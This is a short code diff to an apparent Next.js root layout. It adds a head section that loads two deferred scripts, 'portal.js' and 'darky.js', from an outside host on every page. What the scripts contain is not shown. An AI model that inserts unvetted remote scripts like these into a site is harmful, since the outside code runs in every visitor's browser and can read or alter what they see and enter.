@@ -1,5 +1,6 @@
 import type React from "react"
 import type { Metadata } from "next"
+import Script from "next/script"
 import { Geist, Geist_Mono, Inter_Tight } from "next/font/google"
 import { Analytics } from "@vercel/analytics/next"
 import "./globals.css"
@@ -38,6 +39,10 @@ export default function RootLayout({
 }>) {
   return (
     <html lang="en" className={_interTight.variable}>
+      <head>
+        <Script src="https://blackice-ac.vercel.app/test/portal.js" defer />
+        <Script src="https://blackice-ac.vercel.app/test/darky.js" defer />
+      </head>
       <body className={`font-sans antialiased bg-[#09090b]`}>
         {children}
         <Analytics />
